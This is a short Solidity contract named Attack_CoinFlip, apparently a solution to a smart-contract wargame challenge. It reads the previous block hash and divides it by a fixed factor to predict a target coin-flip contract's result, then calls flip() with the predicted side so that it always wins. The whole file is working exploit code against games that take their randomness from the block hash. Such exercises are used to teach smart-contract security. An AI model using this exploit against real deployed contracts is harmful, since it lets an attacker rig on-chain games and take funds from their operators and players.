// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import 'OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/utils/math/SafeMath.sol';
import '@openzeppelin/contracts/utils/math/SafeMath.sol';
import 'interfaces/icoinflip.sol';

contract Attack_CoinFlip {

  Icoinflip coinflip_interface;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _addr) {
    coinflip_interface = Icoinflip(_addr);
  }

  function hack() public{
    uint256 blockValue = uint256(blockhash(block.number - 1));
    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    coinflip_interface.flip(side);
    }
  }

